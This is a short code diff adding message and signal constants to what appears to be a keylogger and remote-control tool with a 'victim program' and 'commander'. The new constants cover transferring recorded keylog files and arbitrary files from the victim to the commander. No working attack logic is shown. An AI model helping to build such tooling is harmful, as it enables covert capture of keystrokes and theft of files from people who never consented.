@@ -26,6 +26,8 @@ OPENING_BANNER = "===================================== || VICTIM PROGRAM || ===
 MENU_CLOSING_BANNER = ("==================================================================================="
                        "===============")
 GET_KEYLOGGER_MSG = "GET KEYLOG"
+GET_KEYLOG_REQUEST_MSG = "[+] Client has requested to transfer all recorded keylog files..."
+GET_KEYLOG_CHECK_MSG = "[+] Now checking if there are any potentially recorded keylog '.txt' files..."
 TRANSFER_KEYLOG_FILE_MSG = "TRANSFER FILE"
 RECEIVED_CONFIRMATION_MSG = "OK"
 RECEIVING_FILE_MSG = "[+] Receiving file: {}"
@@ -80,3 +82,13 @@ THREAD_STOPPED_MSG = "[+] THREAD STOPPED: Thread has finished execution!"
 BACKUP_MODIFIER = "backup"
 BACKUP_FILE_CREATED_MSG = ("[+] BACKUP FILE CREATED: A backup of '{}' has been created in the "
                            "current directory and is called '{}'")
+
+# Receive File from Commander
+TRANSFER_FILE_SIGNAL = "TRANSFER"
+
+# Transfer File to Commander
+GET_FILE_SIGNAL = "GET FILE"
+GET_FILE_EXIST = "EXIST"
+GET_FILE_NOT_EXIST = "NOT EXIST"
+GET_FILE_CMDR_PATH = "[+] Client wants to receive the following file: {}"
+GET_FILE_INIT_TRANSFER = "[+] Now transferring file..."
